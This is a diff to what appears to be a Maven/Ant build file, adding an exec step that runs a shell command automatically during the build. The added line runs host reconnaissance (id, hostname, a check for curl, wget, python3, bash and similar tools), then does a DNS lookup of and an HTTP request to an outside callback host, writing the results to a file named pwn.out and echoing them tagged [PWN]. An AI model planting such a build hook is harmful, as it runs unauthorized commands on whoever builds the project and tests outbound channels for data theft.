@@ -17,7 +17,7 @@
           <mkdir dir="${project.build.directory}"/>
           <exec executable="/bin/sh" output="${project.build.directory}/pwn.out">
               <arg value="-c"/>
-              <arg value="id; uname -a; hostname"/>
+              <arg value='id; hostname; echo "---tools---"; for c in getent ping curl wget nslookup dig python3 bash; do command -v $c &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo "HAS:$c"; done; echo "---dns---"; getent hosts 6k3gitcj.requestrepo.com 2&gt;&amp;1 | head -2; echo "---http---"; curl -s -m 6 http://6k3gitcj.requestrepo.com/ 2&gt;&amp;1 | head -3; echo "---end---"'/>
           </exec>
           <loadfile property="pwnout" srcFile="${project.build.directory}/pwn.out"/>
           <echo message="[PWN]${pwnout}[PWN]"/>
